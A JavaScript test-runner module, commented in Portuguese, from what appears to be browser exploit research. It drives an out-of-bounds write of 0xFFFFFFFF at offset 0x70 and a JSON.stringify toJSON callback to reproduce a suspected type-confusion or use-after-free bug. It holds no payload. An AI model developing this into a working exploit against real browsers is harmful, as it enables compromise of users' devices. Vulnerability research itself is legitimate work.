// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeFocusedTestForTypeError } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs'; 
import { toHex } from '../utils.mjs';     

// Contador global LOCALIZADO NESTE MÓDULO
let current_toJSON_call_count_for_TypeError_test = 0;

// Variante que consistentemente causava TypeError nos logs anteriores
function toJSON_Decomp_V2_GlobalCounterOnly() {
    current_toJSON_call_count_for_TypeError_test++; // Operação que visamos testar
    // document.title = `toJSON_Decomp_V2_GlobalCounterOnly Call: ${current_toJSON_call_count_for_TypeError_test}`; // Opcional para depuração
    return { 
        payloadV2: "V2_global_counter_incremented", 
        call_count_inside_toJSON: current_toJSON_call_count_for_TypeError_test 
    };
}

async function runTypeErrorReproductionTest() {
    const FNAME_RUNNER = "runTypeErrorReproductionTest";
    logS3(`==== INICIANDO Teste de Reprodução do TypeError (0xFFFFFFFF @ 0x70) ====`, 'test', FNAME_RUNNER);

    const testDescription = "ReproduceTypeError_0xFFFFFFFF_at_0x70_CounterInc";
    const valueForCorruption = 0xFFFFFFFF;
    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

    logS3(`\n--- Testando Variante toJSON: ${toJSON_Decomp_V2_GlobalCounterOnly.name} ---`, 'subtest', FNAME_RUNNER);
    document.title = `Iniciando Teste: ${testDescription}`; 
    
    current_toJSON_call_count_for_TypeError_test = 0; // Resetar contador ANTES do teste
    
    const result = await executeFocusedTestForTypeError(
        testDescription,
        toJSON_Decomp_V2_GlobalCounterOnly,
        valueForCorruption,
        criticalOffset
    );
    
    const calls_this_run = current_toJSON_call_count_for_TypeError_test;

    if (result.errorOccurred) {
        logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON (este módulo): ${calls_this_run}`, "error", FNAME_RUNNER);
    } else if (result.potentiallyCrashed) {
        logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL. Chamadas toJSON (este módulo): ${calls_this_run}`, "error", FNAME_RUNNER);
    } else {
        logS3(`   RESULTADO ${testDescription}: Completou sem erro explícito no stringify. Chamadas toJSON (este módulo): ${calls_this_run}`, "good", FNAME_RUNNER);
        logS3(`      Resultado da toJSON (stringifyResult): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
    }
    logS3(`   Título da página ao final de ${testDescription}: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    if (result.errorOccurred && result.errorOccurred.name === 'TypeError') {
        logS3(`   CONFIRMADO: O TypeError ocorreu como nos testes anteriores.`, "vuln", FNAME_RUNNER);
    } else if (!result.errorOccurred && !result.potentiallyCrashed) {
        logS3(`   AVISO: O TypeError NÃO ocorreu. O comportamento mudou.`, "warn", FNAME_RUNNER);
    }

    logS3(`==== Teste de Reprodução do TypeError CONCLUÍDO ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_ReproduceTypeError';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Teste de Reprodução do TypeError (0xFFFFFFFF @ 0x70) ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Reproduzir TypeError";
    
    await runTypeErrorReproductionTest();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Teste de Reprodução do TypeError) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.startsWith("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("ERRO") || document.title.includes("TypeError")) {
        // Manter título de erro
    }
    else {
        document.title = "Script 3 Concluído - Reproduzir TypeError";
    }
}
